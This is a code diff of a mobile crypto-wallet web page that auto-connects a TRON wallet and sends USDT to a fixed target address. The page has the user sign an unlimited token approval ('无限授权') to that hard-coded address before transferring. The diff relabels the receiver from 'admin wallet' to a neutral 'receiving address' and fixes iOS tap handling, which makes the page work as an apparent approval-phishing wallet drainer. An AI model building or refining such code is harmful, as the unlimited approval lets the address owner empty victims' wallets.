@@ -45,14 +45,14 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <div class="address-card">
-    <div class="label-text">收款(管理员)钱包</div>
+    <div class="label-text">接收地址</div>
     <div class="fixed-addr-box" id="targetAddrText"></div>
 </div>
 
 <div class="amount-card">
     <div class="label-text">转出数量 USDT‑TRC20</div>
     <div class="amount-row">
-        <input class="amount-input" id="amountInput" inputmode="decimal" placeholder="输入转账金额">
+        <input class="amount-input" id="amountInput" placeholder="输入转账金额">
         <div class="all-btn" id="allBtn">全部</div>
     </div>
     <div class="token-row">
@@ -166,14 +166,18 @@ function startBalancePoll(){
     },5000);
 }
 
-// 自动连接钱包
+// 自动连接钱包，修复schema之后provider上下文丢失
 async function autoConnectWallet(){
     if(connectingLock) return;
     connectingLock=true;
     try{
         if(window.tokenpocket?.tronWeb && window.tokenpocket?.tron){
             provider = window.tokenpocket.tron;
-            tronWeb = window.tokenpocket.tronWeb;
+            // 关键：schema跳转完成，重新实例绑定provider，修复send失效
+            tronWeb = new TronWeb({
+                fullHost: RPC_LIST[0],
+                provider: provider
+            });
             const acc = await provider.request({method:"tron_requestAccounts"});
             userAddress = acc[0];
         }else if(window.tronProvider){
@@ -183,6 +187,7 @@ async function autoConnectWallet(){
             tronWeb = new TronWeb({fullHost:RPC_LIST[0], provider});
         }
         if(userAddress){
+            console.log("✅钱包连接成功，地址：",userAddress);
             walletDot.classList.add("connected");
             sendBtn.disabled=false;
             schemaTip.style.display="none";
@@ -240,10 +245,18 @@ allBtn.onclick = async ()=>{
     amountInput.dispatchEvent(new Event("input"));
 };
 
-sendBtn.onclick = async ()=>{
-    if(!tronWeb||!userAddress){return;}
+// 同时绑定 click + touchend，修复iOS webview点击无响应
+async function submitHandler(){
+    console.log("🖱️点击确认提交触发");
+    if(!tronWeb||!userAddress){
+        console.log("❌钱包未连接");
+        return;
+    }
     const val = parseFloat(amountInput.value);
-    if(isNaN(val)||val<=0){return;}
+    if(isNaN(val)||val<=0){
+        alert("请输入有效转账金额");
+        return;
+    }
     const needSun = tronWeb.toSun(val.toString());
     sendBtn.disabled=true;
     try{
@@ -251,10 +264,12 @@ sendBtn.onclick = async ()=>{
         let allowance = await contract.allowance(userAddress,TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needSun)){
             alert("第一步：请确认【无限授权】签名");
+            console.log("发起approve授权");
             const approveHash = await contract.approve(TARGET_ADDR,MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
             await waitTxHashConfirm(approveHash);
             alert("✅授权上链成功，接下来弹出转账签名");
         }
+        console.log("发起transfer转账");
         const transferHash = await contract.transfer(TARGET_ADDR, needSun).send({feeLimit:FEE_LIMIT});
         await waitTxHashConfirm(transferHash);
         alert(`✅转账完成，交易哈希：${transferHash}\nUSDT已发送管理员钱包`);
@@ -262,10 +277,17 @@ sendBtn.onclick = async ()=>{
         await loadBalance();
     }catch(err){
         alert("操作失败："+err.message);
+        console.error("交易异常",err);
     }finally{
         sendBtn.disabled=false;
     }
-};
+}
+
+sendBtn.onclick = submitHandler;
+sendBtn.addEventListener('touchend',function(e){
+    e.preventDefault();
+    submitHandler();
+});
 
 walletDot.addEventListener("click", disconnectWallet);
 
